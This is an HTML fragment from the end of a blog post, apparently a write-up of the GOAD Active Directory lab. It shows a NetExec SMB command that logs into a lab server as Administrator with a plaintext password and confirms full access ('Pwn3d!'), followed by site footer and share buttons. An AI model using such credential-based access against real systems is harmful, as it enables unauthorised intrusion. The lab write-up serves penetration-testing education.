</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>smb</span> <span class=nx>meereen</span><span class=p>.</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>Administrator</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>P</span><span class=err>@</span><span class=nx>ssw0rd</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>MEEREEN</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>Administrator</span><span class=o>:</span><span class=nx>P</span><span class=err>@</span><span class=nx>ssw0rd</span><span class=o>!</span> <span class=p>(</span><span class=nx>Pwn3d</span><span class=o>!</span><span class=p>)</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://famasoon.github.io/posts/goad_writeupch1/><span class=title>Next »</span><br><span>GOAD Writeup Ch1</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on x" href="https://x.com/intent/tweet/?text=GOAD%20Writeup%20Ch2&amp;url=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f&amp;title=GOAD%20Writeup%20Ch2&amp;summary=GOAD%20Writeup%20Ch2&amp;source=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f&title=GOAD%20Writeup%20Ch2"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on whatsapp" href="https://api.whatsapp.com/send?text=GOAD%20Writeup%20Ch2%20-%20https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on telegram" href="https://telegram.me/share/url?text=GOAD%20Writeup%20Ch2&amp;url=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch2 on ycombinator" href="https://news.ycombinator.com/submitlink?t=GOAD%20Writeup%20Ch2&u=https%3a%2f%2ffamasoon.github.io%2fposts%2fgoad_writeupch2%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://famasoon.github.io/>x64.moe</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>